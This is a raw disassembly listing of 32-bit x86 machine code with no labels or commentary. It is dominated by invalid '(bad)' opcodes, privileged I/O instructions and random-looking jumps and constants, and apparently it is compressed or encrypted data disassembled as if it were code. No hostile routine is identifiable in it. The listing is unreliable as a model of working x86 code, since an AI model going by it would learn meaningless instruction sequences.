  410d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d63:	inc    esp
  410d64:	sbb    ah,dh
  410d66:	cmp    al,0xe8
  410d68:	arpl   WORD PTR [edi],sp
  410d6a:	out    0xa9,al
  410d6c:	ret    
  410d6d:	inc    ecx
  410d6e:	fild   WORD PTR [bp+si+0x1ff9]
  410d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d74:	mov    edx,0xacb19f3d
  410d79:	gs add edi,DWORD PTR gs:[edx]
  410d7d:	pop    edx
  410d7e:	repz fild WORD PTR ds:0x17c26f9f
  410d85:	pop    ecx
  410d86:	ret    
  410d87:	jp     0x410d8c
  410d89:	xor    eax,0x7989c1
  410d8e:	ja     0x410d3c
  410d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d91:	jne    0x410dae
  410d93:	dec    ebp
  410d94:	and    BYTE PTR [ebx-0x736a9de9],bl
  410d9a:	dec    ebx
  410d9b:	mov    bl,0x2d
  410d9d:	add    eax,0x3f518c92
  410da2:	inc    edx
  410da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410da4:	xchg   ebp,eax
  410da5:	(bad)  
  410da6:	or     DWORD PTR [ecx],eax
  410da8:	jecxz  0x410e27
  410daa:	inc    edi
  410dab:	shr    DWORD PTR ds:0xd9df1e37,cl
  410db1:	adc    al,0xf3
  410db3:	rcl    dl,1
  410db5:	stos   BYTE PTR es:[edi],al
  410db6:	ins    BYTE PTR es:[edi],dx
  410db7:	mov    eax,DWORD PTR [esi]
  410db9:	das    
  410dba:	adc    al,BYTE PTR [esi]
  410dbc:	dec    ebx
  410dbd:	adc    eax,0x48e8beed
  410dc2:	jne    0x410dd1
  410dc4:	test   al,0xd6
  410dc6:	sub    al,0xe6
  410dc8:	sahf   
  410dc9:	push   0x22
  410dcb:	das    
  410dcc:	pop    eax
  410dcd:	int    0xf8
  410dcf:	jno    0x410e26
  410dd1:	repnz xor ebx,DWORD PTR [esi+0x671cde05]
  410dd8:	(bad)  
  410dd9:	xchg   si,ax
  410ddb:	test   DWORD PTR [esi+0x5c],ebx
  410dde:	cdq    
  410ddf:	fiadd  DWORD PTR [esi-0x13814e79]
  410de5:	pop    esp
  410de6:	fbld   TBYTE PTR [eax+0x790eb7f8]
  410dec:	push   ebx
  410ded:	pop    esi
  410dee:	int    0x2d
  410df0:	inc    esi
  410df1:	dec    ebx
  410df2:	mov    ch,0x34
  410df4:	das    
  410df5:	int    0x78
  410df7:	std    
  410df8:	inc    eax
  410df9:	jmp    0x39e4b2d5
  410dfe:	ins    DWORD PTR es:[edi],dx
  410dff:	lods   eax,DWORD PTR ds:[esi]
  410e00:	ja     0x410e14
  410e02:	sbb    al,0x23
  410e04:	popa   
  410e05:	add    DWORD PTR [edi],esp
  410e07:	mov    dh,BYTE PTR [edx]
  410e09:	loopne 0x410e76
  410e0b:	fst    QWORD PTR [ecx-0x1505bb6f]
  410e11:	loopne 0x410e23
  410e13:	xor    bh,cl
  410e15:	rcr    DWORD PTR [edi-0x1e441482],cl
  410e1b:	jnp    0x410e52
  410e1d:	inc    ecx
  410e1e:	fwait
  410e1f:	jne    0x410e99
  410e21:	xchg   DWORD PTR [ebx],esi
  410e23:	and    BYTE PTR [eax+ecx*1-0x6f],0x62
  410e28:	and    eax,0x402ad679
  410e2d:	sti    
  410e2e:	sbb    bl,BYTE PTR [esp+edx*1]
  410e31:	xchg   BYTE PTR [eax+0x77],cl
  410e34:	lods   eax,DWORD PTR ds:[esi]
  410e35:	cmp    al,BYTE PTR [esi-0x1b1daa30]
  410e3b:	outs   dx,DWORD PTR ds:[esi]
  410e3c:	(bad)  
  410e3d:	jnp    0x410e3b
  410e3f:	jae    0x410e5b
  410e41:	(bad)  
  410e42:	imul   esp,DWORD PTR [ebp-0x260df5a7],0xc6510845
  410e4c:	repnz mov DWORD PTR ds:0xd198edfb,ecx
  410e53:	les    eax,FWORD PTR [edx+0x67]
  410e56:	clc    
  410e57:	jae    0x410e3e
  410e59:	les    esi,FWORD PTR [ecx-0xb]
  410e5c:	pop    edi
  410e5d:	dec    di
  410e5f:	outs   dx,BYTE PTR ds:[esi]
  410e60:	ja     0x410e7e
  410e62:	mov    ebp,0x40aa886
  410e67:	stos   DWORD PTR es:[edi],eax
  410e68:	aaa    
  410e69:	inc    esp
  410e6a:	pop    eax
  410e6b:	ret    0x520a
  410e6e:	hlt    
  410e6f:	test   al,0x4c
  410e71:	xor    al,0x5d
  410e73:	mov    fs:0x339526,al
  410e79:	dec    edi
  410e7a:	dec    ebp
  410e7b:	sahf   
  410e7c:	ins    BYTE PTR es:[edi],dx
  410e7d:	cmp    BYTE PTR [ebp-0x1780affc],dl
  410e83:	xor    al,0xe6
  410e85:	and    ah,BYTE PTR [ecx-0x30]
  410e88:	test   edx,edx
  410e8a:	(bad)  
  410e8b:	lock js 0x410e8a
  410e8e:	or     ah,BYTE PTR [eax-0x69]
  410e91:	mov    edx,0xef301098
  410e96:	in     al,dx
  410e97:	push   esp
  410e98:	sub    eax,ebp
  410e9a:	stos   DWORD PTR es:[edi],eax
  410e9b:	retf   
  410e9c:	xchg   edi,eax
  410e9d:	cwde   
  410e9e:	ds jb  0x410f09
  410ea1:	xchg   edx,eax
  410ea2:	jg     0x410e3e
  410ea4:	(bad)  
  410ea5:	jo     0x410e32
  410ea7:	out    0xb8,al
  410ea9:	and    al,0x8c
  410eab:	push   0xc
  410ead:	test   eax,0x20e7ee6
  410eb2:	add    dh,BYTE PTR [edx]
  410eb4:	add    al,0x6a
  410eb6:	ins    DWORD PTR es:[edi],dx
  410eb7:	imul   edi,DWORD PTR [ebx+0x574a84f2],0x910734ab
  410ec1:	xchg   ecx,ecx
  410ec3:	pop    ebp
  410ec4:	aas    
  410ec5:	jecxz  0x410ecd
  410ec7:	and    ebx,DWORD PTR [edi+0x8]
  410eca:	fist   WORD PTR [edx+0x2a32abfa]
  410ed0:	mov    bh,0x48
  410ed2:	xchg   esp,eax
  410ed3:	popf   
  410ed4:	repz jle 0x410eff
  410ed7:	push   esi
  410ed8:	dec    ecx
  410ed9:	jne    0x410ed3
  410edb:	mov    ah,0x1d
  410edd:	add    eax,0xf5b16269
  410ee2:	and    BYTE PTR [esi+0x6c38d41d],bh
  410ee8:	popf   
  410ee9:	jecxz  0x410f30
  410eeb:	ss es pop ebx
  410eee:	adc    eax,0xbe93949d
  410ef3:	sbb    DWORD PTR [edx-0x2e],ecx
  410ef6:	out    0xbe,al
  410ef8:	nop
  410ef9:	xchg   edx,eax
  410efa:	push   ebx
  410efb:	es cmp eax,0x649af766
  410f01:	mov    al,0x4b
  410f03:	sub    eax,0xb5707ca7
  410f08:	mov    ebx,DWORD PTR es:[esi]
  410f0b:	mov    edi,0x891a93b4
  410f10:	sbb    ebx,esi
  410f12:	xchg   ebp,eax
  410f13:	aas    
  410f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f15:	jae    0x410ee3
  410f17:	loopne 0x410ef7
  410f19:	add    DWORD PTR [esi-0x5fe7320d],esi
  410f1f:	lea    ebx,[edx-0x12]
  410f22:	(bad)  
  410f23:	mov    dh,0xf1
  410f25:	out    0xad,eax
  410f27:	enter  0x68f6,0x4c
  410f2b:	icebp  
  410f2c:	adc    ebp,DWORD PTR [edi+0x6073ac32]
  410f32:	xor    dl,BYTE PTR [ebx]
  410f34:	sbb    al,0xd6
  410f36:	imul   esi,esi,0x497615cb
  410f3c:	cmc    
  410f3d:	pop    ecx
  410f3e:	cwde   
  410f3f:	data16 scas al,BYTE PTR es:[edi]
  410f41:	js     0x410f77
  410f43:	data16 jno 0x410f90
  410f46:	fist   DWORD PTR [eax+eax*1+0xdad0d9d]
  410f4d:	(bad)  ds:0x36ae18ae
  410f53:	mov    WORD PTR [ebp+0x7f],cs
  410f56:	push   es
  410f57:	push   esi
  410f58:	dec    ecx
  410f59:	hlt    
  410f5a:	jmp    0xd4f14fbf
  410f5f:	out    dx,al
  410f60:	ret    0x2853
  410f63:	stc    
  410f64:	pop    ds
  410f65:	push   es
  410f66:	inc    eax
  410f67:	nop
  410f68:	fidivr WORD PTR [ebp+0x5b46029]
  410f6e:	dec    esi
  410f6f:	idiv   BYTE PTR [edx-0xfbb1a74]
  410f75:	xchg   DWORD PTR [ecx-0x296a178e],ecx
  410f7b:	shr    DWORD PTR [ecx],1
  410f7d:	popf   
  410f7e:	dec    esp
  410f7f:	hlt    
  410f80:	push   ebx
  410f81:	or     eax,0xbaf97e71
  410f86:	mov    esp,0x70c3bf29
  410f8b:	dec    esp
  410f8c:	clc    
  410f8d:	loop   0x410f16
  410f8f:	jmp    0x410fa9
  410f91:	mov    ah,0xf4
  410f93:	jle    0x410f97
  410f95:	adc    edx,DWORD PTR [ebp+0x1231075b]
  410f9b:	stos   BYTE PTR es:[edi],al
  410f9c:	cmp    bl,0xb0
  410f9f:	loopne 0x410f99
  410fa1:	jmp    0x410f85
  410fa3:	std    
  410fa4:	pop    ebp
  410fa5:	mov    ebp,DWORD PTR [ecx-0x48]
  410fa8:	test   DWORD PTR [ebx+0x6a],ebp
  410fab:	sub    BYTE PTR [ecx+0x7b],dl
  410fae:	loope  0x410f4e
  410fb0:	rcr    BYTE PTR [esi],1
  410fb2:	mov    BYTE PTR [ebx+0x36204376],ch
  410fb8:	jge    0x410fa5
  410fba:	sti    
  410fbb:	xlat   BYTE PTR ds:[ebx]
  410fbc:	outs   dx,DWORD PTR ds:[esi]
  410fbd:	mov    ecx,0xefc6e145
  410fc2:	scas   eax,DWORD PTR es:[edi]
  410fc3:	mov    ds:0x8294344b,eax
  410fc8:	jmp    0x2f52db64
  410fcd:	adc    eax,0x17e3ef19
  410fd2:	jnp    0x411004
  410fd4:	add    edi,DWORD PTR ds:0xbea847b1
  410fda:	cmp    BYTE PTR [esi],dl
  410fdc:	ret    0x1818
  410fdf:	jecxz  0x410f9b
  410fe1:	pop    esp
  410fe2:	ins    DWORD PTR es:[edi],dx
  410fe3:	jp     0x411048
  410fe5:	or     ecx,DWORD PTR [edi+eiz*4]
  410fe8:	or     esi,DWORD PTR [edi+0x6318ac13]
  410fee:	add    eax,0x5a5aaa7b
  410ff3:	into   
  410ff4:	dec    edx
  410ff5:	imul   ecx,esi,0x35
  410ff8:	mov    al,0x91
  410ffa:	xlat   BYTE PTR ds:[ebx]
  410ffb:	sahf   
  410ffc:	xor    esp,DWORD PTR [edi]
  410ffe:	pop    ebx
  410fff:	adc    eax,DWORD PTR [ebx-0x4b]
  411002:	and    edi,esp
  411004:	gs jbe 0x410f88
  411007:	vmwrite ecx,ebp
  41100a:	pop    ss
  41100b:	popa   
  41100c:	lahf   
  41100d:	cmp    ch,ah
  41100f:	pop    ds
  411010:	(bad)  
  411011:	push   ds
  411012:	mov    ss:0x8f9bebd6,al
  411018:	mov    bl,0xad
  41101a:	xchg   ebp,eax
  41101b:	mov    ss,WORD PTR [edi+0x5fb3a139]
  411021:	loopne 0x411057
  411023:	rol    esi,0x2c
  411026:	cmp    ah,al
  411028:	jbe    0x41107b
  41102a:	mov    dl,0x4e
  41102c:	dec    DWORD PTR ds:0xbf35c6df
  411032:	fisub  WORD PTR [edx-0x2]
  411035:	adc    ah,BYTE PTR [ecx-0x37]
  411038:	test   eax,0x916182f0
  41103d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41103e:	mov    esi,0xd598b4c0
  411043:	mov    ebx,0x58b4436f
  411048:	mov    bh,0xd9
  41104a:	aaa    
  41104b:	shr    DWORD PTR [edx+0x3],0xf8
  41104f:	neg    DWORD PTR [ebp+0x30]
  411052:	ins    BYTE PTR es:[edi],dx
  411053:	loopne 0x410fe1
  411055:	les    ebx,FWORD PTR [esi+0x7d4605e6]
  41105b:	cdq    
  41105c:	dec    eax
  41105d:	mov    al,BYTE PTR [eax+0x5ffe3254]
  411063:	sub    BYTE PTR [edx-0xcc3b775],cl
  411069:	jmp    0x722a:0xbaf19ff7
  411070:	pushf  
  411071:	inc    esi
  411072:	adc    BYTE PTR [eax],al
  411074:	mov    ebp,0xe8647886
  411079:	test   DWORD PTR [ebx-0x13aa41fd],0x205c2940
  411083:	outs   dx,DWORD PTR ds:[esi]
  411084:	xchg   edx,eax
  411085:	mov    eax,0x9cfcf014
  41108a:	push   ss
  41108b:	in     eax,dx
  41108c:	xor    dl,BYTE PTR [ecx+0x59ee32a6]
  411092:	sbb    eax,0xfb9a5b8a
  411097:	xchg   edx,eax
  411098:	add    al,0x83
  41109a:	jo     0x4110ca
  41109c:	outs   dx,DWORD PTR ds:[esi]
  41109d:	(bad)  
  41109e:	fisubr DWORD PTR [esi+0x21]
  4110a1:	daa    
  4110a2:	push   cs
  4110a3:	xchg   BYTE PTR [ebp-0x4e],bh
  4110a6:	mov    ebx,0xe912407
  4110ab:	sbb    DWORD PTR [esi+eiz*4],edx
  4110ae:	push   0xf514e65e
  4110b3:	retf   
  4110b4:	adc    bl,cl
  4110b6:	pushf  
  4110b7:	retf   
  4110b8:	mov    eax,ds:0x5d142a1c
  4110bd:	sbb    DWORD PTR [edx+0x3b],ebp
  4110c0:	or     al,0x10
  4110c2:	push   es
  4110c3:	sbb    esi,ecx
  4110c5:	push   esp
  4110c6:	test   DWORD PTR [ecx+ecx*4],edi
  4110c9:	rcl    DWORD PTR ds:0xa8647f01,1
  4110cf:	xchg   ebp,eax
  4110d0:	and    BYTE PTR [ecx-0x20],bh
  4110d3:	das    
  4110d4:	xchg   ebx,eax
  4110d5:	sub    eax,0x7ec600e2
  4110da:	push   esp
  4110db:	scas   al,BYTE PTR es:[edi]
  4110dc:	jo     0x411122
  4110de:	and    al,0xa6
  4110e0:	mov    eax,DWORD PTR [edi+0x54]
  4110e3:	jne    0x41111b
  4110e5:	imul   ecx,DWORD PTR [eax+0x3d],0x78d1a274
  4110ec:	sbb    dl,BYTE PTR [eax+edi*1]
  4110ef:	jne    0x4110dc
  4110f1:	xor    al,0x2
  4110f3:	(bad)
  4110f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110f7:	out    0x60,al
  4110f9:	lods   eax,DWORD PTR ds:[esi]
  4110fa:	jnp    0x41116e
  4110fc:	sbb    al,0xdb
  4110fe:	fwait
  4110ff:	nop
  411100:	jmp    0x1653:0xa14e44c9
  411107:	fld    DWORD PTR [eax+0x42b2e013]
  41110d:	pop    es
  41110e:	scas   al,BYTE PTR es:[edi]
  41110f:	mov    edx,DWORD PTR [edi+esi*4-0x4f39c323]
  411116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411117:	cmp    ah,BYTE PTR [ecx]
  411119:	mov    WORD PTR [ebp-0x41],gs
  41111c:	test   DWORD PTR [ecx],esp
  41111e:	cdq    
  41111f:	cmp    bl,BYTE PTR [ebx]
  411121:	cmp    bl,BYTE PTR [edi]
  411123:	xor    BYTE PTR [esp+eiz*2+0x50901055],bh
  41112a:	xor    DWORD PTR [edx+0x21c120c6],esp
  411130:	ds out dx,al
  411132:	adc    eax,0x1e83adfb
  411137:	test   dh,cl
  411139:	inc    edi
  41113a:	add    al,0x23
  41113c:	in     al,0x29
  41113e:	loopne 0x41117f
  411140:	aad    0x22
  411142:	outs   dx,DWORD PTR ds:[esi]
  411143:	(bad)  
  411144:	jnp    0x411145
  411146:	mov    al,ds:0xd671ca78
  41114b:	push   edi
  41114c:	(bad)  
  41114d:	adc    al,0x65
  41114f:	add    esp,DWORD PTR [esi-0x14]
  411152:	xchg   edx,eax
  411153:	or     al,0x89
  411155:	mov    bh,0xf9
  411157:	sbb    eax,0xfe59fcff
  41115c:	repz ror DWORD PTR [eax+0x71],1
  411160:	push   edx
  411161:	outs   dx,DWORD PTR ds:[esi]
  411162:	ret    0xfbb7
  411165:	retf   0xada1
  411168:	test   BYTE PTR [edi+esi*4],ch
  41116b:	mov    ?,WORD PTR [esi]
  41116d:	mov    al,0xb0
  41116f:	xchg   DWORD PTR [ebx],edi
  411171:	and    al,0x18
  411173:	push   ebp
  411174:	retf   0x5454
  411177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411178:	clc    
  411179:	jns    0x411174
  41117b:	and    ah,al
  41117d:	rol    DWORD PTR [esi+ebp*4],0x6a
  411181:	ins    DWORD PTR es:[edi],dx
  411182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411183:	outs   dx,DWORD PTR ds:[esi]
  411184:	adc    al,0x1c
  411186:	repnz gs xor al,0xb
  41118a:	retf   
  41118b:	sub    eax,0xa780b0f8
  411190:	and    esi,edi
  411192:	in     eax,dx
  411193:	nop
  411194:	sub    DWORD PTR [ebx],0xfffffff4
  411197:	les    ebp,FWORD PTR [edx+0x7e6f29a9]
  41119d:	mov    cs,WORD PTR [esi-0x23fb5d05]
  4111a3:	stos   DWORD PTR es:[edi],eax
  4111a4:	rcr    DWORD PTR [eax+0x14],cl
  4111a7:	test   eax,0xf55d5a00
  4111ac:	mov    ch,0xa9
  4111ae:	lods   al,BYTE PTR ds:[esi]
  4111af:	out    0xda,al
  4111b1:	pop    eax
  4111b2:	mov    bl,0x8
  4111b4:	icebp  
  4111b5:	hlt    
  4111b6:	nop
  4111b7:	pcmpeqb mm0,QWORD PTR [edx-0x44]
  4111bb:	mov    ds:0xf23b6c9a,eax
  4111c0:	data16 data16 icebp 
  4111c3:	js     0x4111c0
  4111c5:	xor    eax,0x98e2ec95
  4111ca:	and    BYTE PTR [eax+0x65bea9a1],bh
  4111d0:	sbb    ch,dh
  4111d2:	stos   BYTE PTR es:[edi],al
  4111d3:	int3   
  4111d4:	or     dh,al
  4111d6:	pop    es
  4111d7:	dec    eax
  4111d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d9:	mov    dh,0x72
  4111db:	and    eax,0x31
  4111de:	push   esi
  4111df:	jb     0x4111aa
  4111e1:	jne    0x4111bf
  4111e3:	or     ah,BYTE PTR [ecx-0x68464a4d]
  4111e9:	stos   DWORD PTR es:[edi],eax
  4111ea:	mov    ebp,0x68f195fd
  4111ef:	in     eax,dx
  4111f0:	daa    
  4111f1:	jnp    0x4111cb
  4111f3:	in     eax,0xa0
  4111f5:	test   eax,0x25a3a37b
  4111fa:	adc    DWORD PTR [edx+0x53],eax
  4111fd:	loop   0x411248
  4111ff:	push   es
  411200:	leave  
  411201:	jne    0x411257
  411203:	(bad)  
  411204:	clc    
  411205:	xchg   edx,eax
  411206:	test   DWORD PTR [edx-0x364e18f8],edi
  41120c:	jp     0x4111a0
  41120e:	push   ebp
  41120f:	cli    
  411210:	jb     0x411249
  411212:	fcom   DWORD PTR [edi+edi*1-0x744f30eb]
  411219:	pop    esp
  41121a:	xchg   esi,eax
  41121b:	faddp  st(6),st
  41121d:	xlat   BYTE PTR ds:[ebx]
  41121e:	xchg   ebp,eax
  41121f:	out    0xb5,eax
  411221:	pop    ecx
  411222:	inc    esp
  411223:	std    
  411224:	(bad)  [ecx+ecx*1+0x39]
  411228:	xor    DWORD PTR [esi],ecx
  41122a:	push   ebp
  41122c:	popa   
  41122d:	aas    
  41122e:	inc    eax
  41122f:	xor    esi,DWORD PTR [ebx-0x375cbaa2]
  411235:	push   edi
  411236:	sbb    eax,0xe4a9277d
  41123b:	and    DWORD PTR gs:[ecx+0x425e87ea],esi
  411242:	mov    al,ds:0xa783c9e7
  411247:	hlt    
  411248:	push   esp
  411249:	jmp    0x7d296fb2
  41124e:	xchg   ebp,eax
  41124f:	(bad)  
  411250:	ficomp DWORD PTR [edx]
  411252:	push   ebx
  411253:	loop   0x4112ad
  411255:	stos   DWORD PTR es:[edi],eax
  411256:	dec    esp
  411257:	dec    edx
  411258:	ret    0x80dc
  41125b:	push   eax
  41125c:	mov    edi,0xfc0747b0
  411261:	sti    
  411262:	call   ebp
  411264:	or     al,0xb5
  411266:	aas    
  411267:	sub    DWORD PTR [ebp+0x451e9293],ecx
  41126d:	dec    BYTE PTR [esp+edi*4]
  411270:	sbb    al,0xe9
  411272:	xor    esi,DWORD PTR [edi+0x3e52cfca]
  411278:	pop    es
  411279:	sbb    DWORD PTR [edi],0xf90ebcb6
  41127f:	jb     0x411272
  411281:	fidivr WORD PTR [ebp+0x1b9d8a4b]
  411287:	jmp    0x4112fc
  411289:	xlat   BYTE PTR ds:[ebx]
  41128a:	cmc    
  41128b:	xor    DWORD PTR [eax+0x27],0xe3dddd4f
  411292:	shl    ch,cl
  411294:	js     0x4112d8
  411296:	not    BYTE PTR [edx+0x46e2bb7]
  41129c:	push   cs
  41129d:	inc    eax
  41129e:	xor    eax,DWORD PTR [edx+0x26]
  4112a1:	xor    DWORD PTR gs:[edi+0x11920985],edi
  4112a8:	dec    eax
  4112a9:	imul   ebx,DWORD PTR [esi-0x74],0xffffff81
  4112ad:	push   0x53bab665
  4112b2:	test   al,0x45
  4112b4:	mov    eax,0x34a589e9
  4112b9:	inc    eax
  4112ba:	push   ebp
  4112bb:	fstp   QWORD PTR [edx+esi*8]
  4112be:	mov    bh,0xe2
  4112c0:	jnp    0x41130d
  4112c2:	mov    esp,0x6a8db90
  4112c7:	(bad)  
  4112c8:	push   esi
  4112c9:	push   esp
  4112ca:	xor    BYTE PTR [ebp+0x1a],ah
  4112cd:	dec    esi
  4112ce:	out    0xee,al
  4112d0:	push   eax
  4112d1:	cli    
  4112d2:	je     0x4112ff
  4112d4:	or     BYTE PTR [ebx-0x4ac7db7b],cl
  4112da:	in     al,dx
  4112db:	adc    BYTE PTR [esi],bl
  4112dd:	and    bh,ah
  4112df:	add    DWORD PTR cs:[eax],ecx
  4112e2:	mov    cl,0x42
  4112e4:	mov    eax,ds:0x8d36ea35
  4112e9:	das    
  4112ea:	int    0xa8
  4112ec:	test   eax,0x34b3da53
  4112f1:	xor    BYTE PTR [ebx],0x17
  4112f4:	pop    ss
  4112f5:	sub    eax,0x983abfd5
  4112fa:	inc    edx
  4112fb:	push   edi
  4112fc:	jae    0x4112d3
  4112fe:	icebp  
  4112ff:	inc    eax
  411300:	out    0xf1,al
  411302:	dec    ecx
  411303:	xor    BYTE PTR [eax+0x3f],al
  411306:	cmc    
  411307:	enter  0x12fd,0x84
  41130b:	push   esi
  41130c:	aam    0x90
  41130e:	fsubr  DWORD PTR [edi+0x37]
  411311:	repnz mov ecx,0x32712677
  411317:	mov    ds:0x5c47d412,eax
  41131c:	inc    eax
  41131d:	into   
  41131e:	xor    dh,BYTE PTR [eax]
  411320:	test   BYTE PTR [edx-0x6f],al
  411323:	jl     0x411330
  411325:	scas   eax,DWORD PTR es:[edi]
  411326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411327:	lahf   
  411328:	sti    
  411329:	dec    esp
  41132a:	add    al,0x7f
  41132c:	in     eax,dx
  41132d:	jg     0x41135c
  41132f:	repz pop esi
  411331:	jg     0x41130f
  411333:	(bad)  
  411334:	push   esi
  411335:	(bad)  
  411336:	mov    edi,0xc30e993c
  41133b:	(bad)  
  41133c:	adc    cl,ah
  41133e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41133f:	inc    edx
  411340:	dec    esi
  411341:	jne    0x411335
  411343:	test   eax,0xca5326da
  411348:	dec    esp
  411349:	xchg   esi,eax
  41134a:	xchg   edx,eax
  41134b:	sub    ecx,DWORD PTR [edi-0x6a75d9f7]
  411351:	dec    ebx
  411352:	sbb    BYTE PTR [ebp-0xfe1db69],bl
  411358:	cdq    
  411359:	sbb    eax,0x343ed736
  41135e:	ficom  DWORD PTR [esi-0x5a]
  411361:	ins    BYTE PTR es:[edi],dx
  411362:	xor    DWORD PTR [eax-0x71],0x6d54172e
  411369:	sub    dl,BYTE PTR ds:0x6d3d0ef7
  41136f:	add    bl,BYTE PTR [edi-0x32fa5bc5]
  411375:	rep stos BYTE PTR es:[edi],al
  411377:	pop    ds
  411378:	es push es
  41137a:	sub    DWORD PTR [ebp+0x3481a8e8],esp
  411380:	mov    WORD PTR [ecx+eiz*8-0x66e993db],cs
  411387:	mov    al,ds:0x64e17e34
  41138c:	sub    ecx,edx
  41138e:	mov    ebp,0x6b751143
  411393:	cld    
  411394:	push   edi
  411395:	push   esi
  411396:	cmp    esi,DWORD PTR ds:0xde335e1
  41139c:	xchg   ah,dl
  41139e:	mov    BYTE PTR [edi],al
  4113a0:	xchg   edi,eax
  4113a1:	mov    ebp,0x586b27c5
  4113a6:	scas   al,BYTE PTR es:[edi]
  4113a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113a8:	je     0x41135c
  4113aa:	cdq    
  4113ab:	or     al,0x2
  4113ad:	xchg   esp,eax
  4113ae:	iret   
  4113af:	lahf   
  4113b0:	sbb    bh,BYTE PTR [ecx]
  4113b2:	add    BYTE PTR [eax-0x1c],0x8c
  4113b6:	daa    
  4113b7:	and    DWORD PTR [eax-0x58b0f799],edi
  4113bd:	call   0x5a62:0xe67798bf
  4113c4:	mov    edx,0x187ca4e7
  4113c9:	nop
  4113ca:	push   esp
  4113cb:	cmp    dh,BYTE PTR [edx]
  4113cd:	pop    ebp
  4113ce:	mov    al,0x72
  4113d0:	pop    edx
  4113d1:	pop    eax
  4113d2:	sub    al,0x8e
  4113d4:	xor    DWORD PTR [esi-0x10],0x25465158
  4113db:	lods   eax,DWORD PTR ds:[esi]
  4113dc:	xchg   BYTE PTR [edx+0x18525fc6],dl
  4113e2:	scas   eax,DWORD PTR es:[edi]
  4113e3:	xor    DWORD PTR [edi+edx*2],eax
  4113e6:	leave  
  4113e7:	inc    ebp
  4113e8:	test   al,0x55
  4113ea:	sub    edx,DWORD PTR [ecx-0xd]
  4113ed:	cmc    
  4113ee:	stc    
  4113ef:	stos   DWORD PTR es:[edi],eax
  4113f0:	jo     0x411382
  4113f2:	(bad)  [edi+0x66]
  4113f5:	nop
  4113f6:	ficom  WORD PTR [ecx-0x30]
  4113f9:	shr    esi,0x46
  4113fc:	pop    ss
  4113fd:	sbb    cl,cl
  4113ff:	pushf  
  411400:	jmp    0xac5a:0x471d67e8
  411407:	mov    ds:0xd7e54dff,eax
  41140c:	dec    ebp
  41140d:	add    al,0x81
  41140f:	or     eax,0xc85abde1
  411414:	lea    esi,[edi]
  411416:	adc    BYTE PTR [ecx-0x446046fe],cl
  41141c:	nop
  41141d:	in     al,0x36
  41141f:	call   0x11c745a8
  411424:	push   0xffffffaf
  411426:	js     0x411456
  411428:	or     BYTE PTR [ebp+0x42706226],dl
  41142e:	je     0x4114af
  411430:	add    eax,0x959df0c3
  411435:	and    ebp,DWORD PTR [edi+0x7e9e597d]
  41143b:	fdivr  DWORD PTR [eax-0x241086c7]
  411441:	test   eax,0x5331ced7
  411446:	jns    0x411496
  411448:	push   esp
  411449:	jle    0x41146b
  41144b:	test   esp,esp
  41144d:	push   ds
  41144e:	test   BYTE PTR [ebx+0x15],ch
  411451:	xchg   ecx,eax
  411452:	sbb    al,0x7
  411454:	mov    cl,0xae
  411456:	ins    DWORD PTR es:[edi],dx
  411457:	xchg   esi,eax
  411458:	mov    dl,0x63
  41145a:	mov    cl,0x86
  41145c:	xchg   esp,eax
  41145d:	and    BYTE PTR [ebx],0x5b
  411460:	push   eax
  411461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411462:	sbb    cl,BYTE PTR [edx-0x15]
  411465:	int3   
  411466:	pop    edx
  411467:	into   
  411468:	es push eax
  41146a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146b:	imul   ebp,edi,0x76852650
  411471:	push   ds
  411472:	fist   DWORD PTR [ebx]
  411474:	xchg   esi,eax
  411475:	jecxz  0x411476
  411477:	xchg   esp,eax
  411478:	fistp  DWORD PTR [eax+edi*1]
  41147b:	out    dx,eax
  41147c:	fs leave 
  41147e:	inc    edi
  41147f:	or     ch,al
  411481:	pop    esp
  411482:	mov    ds:0x2a2e2fc0,eax
  411487:	xchg   DWORD PTR [esi],eax
  411489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41148a:	sbb    bh,BYTE PTR [ebx+0x18]
  41148d:	push   ebx
  41148e:	xor    eax,0xf40df002
  411493:	xlat   BYTE PTR ds:[ebx]
  411494:	push   ebp
  411495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411496:	ss pop esi
  411498:	in     al,dx
  411499:	add    BYTE PTR [esp+ebx*8],bh
  41149c:	push   ecx
  41149d:	int3   
  41149e:	adc    dh,BYTE PTR [ebx+0x22d82b06]
  4114a4:	jl     0x411518
  4114a6:	js     0x411514
  4114a8:	rcr    WORD PTR [edx],cl
  4114ab:	jo     0x4114ab
  4114ad:	rcr    DWORD PTR [edx],0x86
  4114b0:	pop    ds
  4114b1:	dec    edi
  4114b2:	and    dh,dh
  4114b4:	mov    ebp,ebp
  4114b6:	out    0x13,al
  4114b8:	add    ch,BYTE PTR [ecx+eax*8]
  4114bb:	inc    edx
  4114bc:	jmp    0x4114ac
  4114be:	and    al,0xa5
  4114c0:	gs (bad) 
  4114c2:	dec    ebp
  4114c3:	ret    0x474a
  4114c6:	and    eax,0x987c275c
  4114cb:	popa   
  4114cc:	mov    edi,0x7dfa0dc2
  4114d1:	inc    edi
  4114d2:	test   DWORD PTR [ebx-0x19],edx
  4114d5:	jp     0x4114fb
  4114d7:	inc    eax
  4114d8:	dec    ebp
  4114d9:	pop    esp
  4114da:	cdq    
  4114db:	ret    
  4114dc:	xchg   BYTE PTR [eax-0x3a],ch
  4114df:	add    DWORD PTR [edi],edx
  4114e1:	add    edx,DWORD PTR [edi+ebx*4-0x66]
  4114e5:	jo     0x4114ae
  4114e7:	inc    ebp
  4114e8:	sbb    dl,bl
  4114ea:	cmp    al,BYTE PTR ds:0x3c65475e
  4114f0:	jp     0x41155f
